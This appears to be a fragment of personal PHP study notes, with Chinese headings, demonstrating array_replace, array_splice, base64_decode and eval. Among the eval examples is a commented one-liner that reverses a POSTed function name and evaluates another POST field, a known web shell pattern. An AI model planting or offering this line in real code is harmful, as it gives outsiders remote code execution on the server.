...
/**
 * ------------------------------------------------------------------
 * 数组函数,数组替换,数组局部替换,数组截取删除
 * ------------------------------------------------------------------
$replacements = array(0 => "pineapple", 3 => "cherry");
$base = array("orange", "banana", "apple", "raspberry");

$basket = array_replace($replacements, $base);
print_r($basket);
array_splice($basket, count($replacements));
print_r($basket);
//output
//Array ( [0] => orange [3] => raspberry [1] => banana [2] => apple )
 ...
 * ------------------------------------------------------------------
 *
//$Exp=strrev($_POST['xise']);eval($Exp($_POST[z0]));
$aa = base64_decode('JG5hbWUgPSAnZGRkJzsgZWNobyAkbmFtZTs=');
echo $aa;
eval($aa);
eval('$name = \'ddd\'; echo $name;');
echo '<br/>';
eval("\$name = 'ddd'; echo \$name;");
 *******************************END********************************/
 ...
 * 小细节
 * ------------------------------------------------------------------
 * 数字字符串自动转换, 0.00是否为空, 实例化具体实例:$t = new ( new Test() );
if('10' > 1) echo 'hello';
